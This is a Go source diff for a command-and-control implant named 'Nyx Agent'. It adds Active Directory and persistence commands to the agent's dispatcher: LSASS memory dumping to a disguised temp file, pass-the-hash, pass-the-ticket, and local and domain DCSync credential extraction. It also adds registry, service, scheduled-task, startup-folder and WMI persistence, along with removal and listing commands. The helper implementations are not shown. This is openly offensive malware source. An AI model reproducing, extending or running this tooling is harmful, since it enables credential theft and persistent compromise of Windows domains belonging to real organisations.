@@ -806,6 +806,165 @@ func dispatch(command string) (string, string) {
 	case "dns-beacon-status":
 		return dnsBeaconStatus(), "completed"
 
+	// ── Phase 6: Active Directory & Persistence ─────────────────────────────
+
+	case "lsass-dump":
+		// usage: lsass-dump [out_path]
+		outPath := `C:\Windows\Temp\debug.dmp`
+		if arg != "" {
+			outPath = strings.TrimSpace(arg)
+		}
+		out, err := lsassDump(outPath)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "pth":
+		// usage: pth <domain> <user> <ntlm_hash> <cmd>
+		p := strings.SplitN(arg, " ", 4)
+		if len(p) < 4 {
+			return "usage: pth <domain> <user> <ntlm_hash> <cmd>", "failed"
+		}
+		out, err := passTheHash(p[0], p[1], p[2], p[3])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "ptt":
+		// usage: ptt <base64_kirbi>
+		if arg == "" {
+			return "usage: ptt <base64_kirbi>", "failed"
+		}
+		out, err := passTheTicket(strings.TrimSpace(arg))
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "dcsync-local":
+		// usage: dcsync-local [out_dir]
+		outDir := `C:\Windows\Temp\hashes`
+		if arg != "" {
+			outDir = strings.TrimSpace(arg)
+		}
+		out, err := dcsyncLocal(outDir)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "dcsync-domain":
+		// usage: dcsync-domain [out_dir]
+		outDir := `C:\Windows\Temp\ntds`
+		if arg != "" {
+			outDir = strings.TrimSpace(arg)
+		}
+		out, err := dcsyncDomain(outDir)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "persist-reg":
+		// usage: persist-reg <name> <payload>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: persist-reg <name> <payload>", "failed"
+		}
+		out, err := persistReg(p[0], p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "persist-svc":
+		// usage: persist-svc <name> <bin_path>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: persist-svc <name> <bin_path>", "failed"
+		}
+		out, err := persistService(p[0], p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "persist-task":
+		// usage: persist-task <name> <cmd> [trigger]
+		p := strings.SplitN(arg, " ", 3)
+		if len(p) < 2 {
+			return "usage: persist-task <name> <cmd> [ONLOGON|DAILY|HOURLY]", "failed"
+		}
+		trigger := "ONLOGON"
+		if len(p) == 3 {
+			trigger = p[2]
+		}
+		out, err := persistTask(p[0], p[1], trigger)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "persist-startup":
+		// usage: persist-startup <name> <src_path>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: persist-startup <name> <src_path>", "failed"
+		}
+		out, err := persistStartup(p[0], p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "persist-wmi":
+		// usage: persist-wmi <name> <cmd>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: persist-wmi <name> <cmd>", "failed"
+		}
+		out, err := persistWMI(p[0], p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "persist-remove":
+		// usage: persist-remove <type> <name>  (type: reg|svc|task|startup|wmi)
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: persist-remove <reg|svc|task|startup|wmi> <name>", "failed"
+		}
+		var out string
+		var err error
+		switch strings.ToLower(p[0]) {
+		case "reg":
+			out, err = persistRegRemove(p[1])
+		case "svc":
+			out, err = persistServiceRemove(p[1])
+		case "task":
+			out, err = persistTaskRemove(p[1])
+		case "startup":
+			out, err = persistStartupRemove(p[1])
+		case "wmi":
+			out, err = persistWMIRemove(p[1])
+		default:
+			return "unknown type: " + p[0] + " (reg|svc|task|startup|wmi)", "failed"
+		}
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "persist-list":
+		out, err := persistList()
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
 	case "kill":
 		fmt.Println("[!] Kill command received, exiting.")
 		os.Exit(0)
@@ -954,7 +1113,7 @@ func removePersistence() string {
 }
 
 func main() {
-	fmt.Println("[*] Nyx Agent v0.9.0 starting...")
+	fmt.Println("[*] Nyx Agent v1.1.0 starting...")
 
 	// Kill date check
 	checkKillDate()
